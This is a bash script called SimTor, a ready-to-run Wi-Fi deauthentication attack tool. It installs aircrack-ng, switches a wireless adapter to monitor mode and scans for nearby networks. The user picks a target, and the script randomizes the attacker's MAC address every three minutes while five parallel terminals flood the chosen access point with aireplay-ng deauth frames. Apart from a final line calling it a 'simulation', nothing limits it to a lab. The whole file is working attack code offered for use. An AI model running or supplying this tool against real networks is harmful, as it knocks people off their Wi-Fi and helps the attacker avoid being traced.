#!/bin/bash
# SimTor
# Author: MrSima
clear
TOOL_NAME="SimTor"
AUTHOR="MrSima"
REQUIRED_PKGS=(figlet xterm)

print_header() {
  clear
  if command -v figlet >/dev/null 2>&1; then
    figlet -c "$TOOL_NAME"
  else
    echo "==== $TOOL_NAME ===="
  fi
  printf "%s\n" "Author: $AUTHOR"
  echo "---------------------------------------------"
}
print_header
if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run as ROOT"
    echo "    Use: sudo ./simtor.sh"
    exit 1
fi
echo "====================================="
echo "     SimTor – Package Installer"
echo "====================================="
echo -e "[+] Checking for required packages...\n"

# Packages that are real Debian packages
DEB_PKGS=("aircrack-ng" "macchanger" "xterm" "figlet")

# Commands that must exist but are part of a package
CMD_PKGS=("airmon-ng" "airodump-ng")

# Check Debian packages
for pkg in "${DEB_PKGS[@]}"; do
    echo -n "Checking $pkg ... "

    if dpkg -s "$pkg" &> /dev/null; then
        echo "✔ Installed"
    else
        echo "✘ Not installed"
        echo "    ➤ Installing $pkg ..."
        if  apt install -y "$pkg" &> /dev/null; then
            echo "      ✔ Installation successful"
        else
            echo "      ✘ Installation failed. Exiting..."
            exit 1
        fi
    fi
done

# Check commands (like airmon-ng)
for cmd in "${CMD_PKGS[@]}"; do
    echo -n "Checking $cmd ... "

    if command -v "$cmd" &> /dev/null; then
        echo "✔ Available"
    else
        echo "✘ Missing"
        echo "    ➤ Installing aircrack-ng (contains $cmd) ..."
        if  apt install -y aircrack-ng &> /dev/null; then
            echo "      ✔ $cmd installed (via aircrack-ng)"
        else
            echo "      ✘ Failed to install $cmd. Exiting..."
            exit 1
        fi
    fi
done

echo -e "\n[+] All required tools are ready!"
echo
#==================================================
echo "====================================="
echo "     SimTor – Adaptor Setup"
echo "====================================="

# Step 1: Detect wireless adapter
echo -e "\n[+] Checking for wireless adapter..."

adapter_name=$(iwconfig 2>/dev/null | awk '/IEEE 802\.11/ {print $1; exit}')

if [ -z "$adapter_name" ]; then
    echo "[-] No wireless adapter detected."
    echo "    • Ensure WiFi device is connected"
    echo "    • Run:  rfkill unblock all"
    exit 1
else
    echo "[✔] Wireless interface detected: $adapter_name"
fi

#==================================================
# Step 2: Rename interface
echo -e "\n[+] Renaming wireless interface to 'simtor'..."

new_name="simtor"

if  ip link set "$adapter_name" down &&  ip link set "$adapter_name" name "$new_name"; then
    echo "[✔] Renamed $adapter_name → $new_name"
else
    echo "[-] Failed to rename interface. Check permissions."
    exit 1
fi

#==================================================
# Step 3: Enable monitor mode
echo -e "\n[+] Setting interface '$new_name' to monitor mode..."

 airmon-ng check kill &>/dev/null

if  airmon-ng start "$new_name" &>/dev/null; then
    echo "[✔] Monitor mode enabled on ${new_name}mon"
else
    echo "[-] Failed to enable monitor mode."
    exit 1
fi
echo
#==================================================
echo "====================================="
echo "     SimTor – Network Scanner"
echo "====================================="
# Step 4: Network scanning
echo -e "\n[+] Starting network scanning..."

SCAN_FILE="/tmp/simtor_scan"

 rm -f ${SCAN_FILE}* 2>/dev/null

xterm -geometry 80x20+200+200 \
    -title "SimTor - Press Q to stop scanning" \
    -e "airodump-ng --write '${SCAN_FILE}' --output-format csv ${new_name}"


#==================================================
# Step 5: Process scan results
echo -e "\n[+] Processing scan results..."

CSV="${SCAN_FILE}-01.csv"

if [ ! -f "$CSV" ]; then
    echo "[-] No scan file found. Did you close the scan window with Q?"
    exit 1
fi

mapfile -t simtor_networks < <(
    awk -F',' 'NR>2 && $1!~/Station/ && length($14)>0 {
        gsub(/^[ \t]+|[ \t]+$/, "", $1)
        gsub(/^[ \t]+|[ \t]+$/, "", $14)
        gsub(/^[ \t]+|[ \t]+$/, "", $4)
        print $1","$14","$4
    }' "$CSV"
)

if [ ${#simtor_networks[@]} -eq 0 ]; then
    echo "[-] No networks detected."
    exit 1
fi
simfunc(){
clear
print_header
echo "[+] Detected Networks:"
for i in "${!simtor_networks[@]}"; do
    echo "  [$i] ${simtor_networks[$i]}"
done
echo -e "\n[✔] Choose a network index to continue:"
while true; do
    read -p "[✔] Enter network index: " selected

    if ! [[ "$selected" =~ ^[0-9]+$ ]]; then
        echo "[!] Enter numbers only."
        continue
    fi
    if [[ -z "${simtor_networks[$selected]}" ]]; then
        echo "[!] Invalid index. Select from the list."
        continue
    fi

    break
done

# Extract BSSID, ESSID, CHAN from selected entry
selected_entry="${simtor_networks[$selected]}"
IFS=',' read -r SELECTED_BSSID SELECTED_ESSID SELECTED_CHAN <<< "$selected_entry"

echo ""
echo "[+] Selected Network:"
echo "   • ESSID   : $SELECTED_ESSID"
echo "   • BSSID   : $SELECTED_BSSID"
echo "   • Channel : $SELECTED_CHAN"
echo ""

#==================================================
echo "====================================="
echo " SimTor –   MAC RANDOMIZER"
echo "====================================="
# Step 6: MAC Randomizer
echo -e "[+] Initializing MAC Randomizer...\n"

xterm -geometry 60x12+900+600 \
    -title "MAC Randomizer" \
    -e bash -c "
        while true; do
            echo '[MAC] Randomizing simtor interface...';
             ip link set simtor down;
             macchanger -r simtor;
             ip link set simtor up;
            sleep 180;
        done
    " &

MAC_PID=$!

#==================================================
echo "====================================="
echo " SimTor –  Deauthentication Launcher"
echo "====================================="
# Step 7: Deauthenticator

echo -e "\n[+] Preparing multi-terminal deauthentication setup …"
echo -e "[+] Launching deauth senders...\n"
iwconfig simtor channel $SELECTED_CHAN
declare -a PIDS=()

# LEFT STACK (Senders 1,2,3)
for i in 1 2 3; do
    xterm -geometry 60x12+50+$((i*180)) \
        -title "Sender $i" \
        -e bash -c "
            while true; do
                echo '[Sender-$i] sending deauth → $SELECTED_BSSID (CH: $SELECTED_CHAN)';
                 aireplay-ng --deauth 5 -a $SELECTED_BSSID simtor;
                sleep 1;
            done
        " &
    PIDS+=($!)
done

# RIGHT STACK (Senders 4,5)
for i in 4 5; do
    xterm -geometry 60x12+900+$(((i-3)*180)) \
        -title "Sender $i" \
        -e bash -c "
            while true; do
                echo '[Sender-$i] sending deauth → $SELECTED_BSSID (CH: $SELECTED_CHAN)';
                 aireplay-ng --deauth 5 -a $SELECTED_BSSID simtor;
                sleep 1;
            done
        " &
    PIDS+=($!)
done
# ======================================================================
# MAIN CONTROLLER Terminal
# ======================================================================
xterm -geometry 110x30+300+200 \
    -title "SimTor – MAIN Controller" \
    -e bash -c "
        echo 'SimTor Deauthentication System Running';
        echo 'Target: $SELECTED_ESSID  ($SELECTED_BSSID)';
        echo '';
        echo '[Q] Quit all terminals';
        echo '[N] Select another network';
        echo '';
        while true; do
            read -rp 'Enter option: ' key

            case \"\$key\" in
                q|Q)
                    echo '[+] Stopping all terminals...';
                    exit 3  
                    ;;
                n|N)
                    echo '[+] Switching to network selection menu...';
                    exit 2  
                    ;;
                *)
                    echo '[!] Invalid option. Use Q or N.'
                    ;;
            esac
        done
    " &
MAIN_PID=$!
wait $MAIN_PID
EXIT_CODE=$?

# ===========================
# EXIT THE WHOLE SCRIPT
# ===========================
if [[ $EXIT_CODE -eq 3 ]]; then
    echo "[+] QUITTING everything..."
    
    echo "[+] Stopping all sender terminals..."
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done

    kill "$MAC_PID" 2>/dev/null

    echo "[+] All processes stopped. Exiting SimTor."
    exit 0
fi

# ===========================
# RETURN TO NETWORK SELECTION
# ===========================
if [[ $EXIT_CODE -eq 2 ]]; then
    echo "[+] Stopping all sender terminals..."
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    kill "$MAC_PID" 2>/dev/null

    echo "[+] Returning to network selection..."
    simfunc
fi
}
simfunc
# ======================================================================
echo -e "\n[✔] Deauthentication simulation ended safely."
echo "[✔] Returning to main script...\n"

exit 0

